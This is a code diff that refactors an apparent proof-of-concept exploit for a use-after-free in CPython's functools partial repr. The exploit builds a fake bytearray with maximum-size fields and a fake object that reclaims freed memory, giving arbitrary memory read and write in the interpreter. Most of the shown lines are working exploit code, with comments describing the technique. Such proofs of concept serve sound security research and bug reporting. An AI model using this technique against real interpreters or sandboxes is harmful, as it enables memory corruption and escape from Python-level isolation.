@@ -24,7 +24,7 @@ partial_repr(PyObject *self)
         Py_DECREF(mod);
         goto error;
     }
-    result = PyUnicode_FromFormat("%S.%S(%R%U)", mod, name, pto->fn, arglist); // <--- uses `mod`, `name`, and pto->fn without
+    result = PyUnicode_FromFormat("%S.%S(%R%U)", mod, name, pto->fn, arglist); // <--- uses `mod`, `name`, and `pto->fn` without
                                                                                // incrementing the refcounts beforehand
     Py_DECREF(mod);
     Py_DECREF(name);
@@ -45,6 +45,7 @@ partial_repr(PyObject *self)
 # Finally, we reclaim the freed memory with data for a fake object that includes an evil bytearray object in one of its slots. We give this object
 # a __repr__ function to be able to recover that evil bytearray object once the format string tries calling repr on it (%R fmt).
 
+from common import evil_bytearray_obj, p_long
 from functools import partial
 
 class evil_str:
@@ -76,22 +77,14 @@ class catch:
         mem = self.mem
         return "x"
 
-p64 = lambda num: num.to_bytes(8, 'little')
-
-# fake bytearray
-fake_ba = (
-    p64(0x123456) +
-    p64(id(bytearray)) +
-    p64(2**63 - 1) +
-    p64(2**63 - 1) +
-    p64(0) + p64(0)
-)
+# see ./common/common.py for evil bytearray obj explanation
+fake_ba, ba_addr = evil_bytearray_obj()
 
 # fake object with the fake bytearray in the first slot
 fake_obj = (
-    p64(0x123456) +
-    p64(id(catch)) +
-    p64(id(fake_ba) + bytes.__basicsize__ - 1)
+    p_long(0x123456) +
+    p_long(id(catch)) +
+    p_long(ba_addr)
 )
 
 SIZE = 0x100
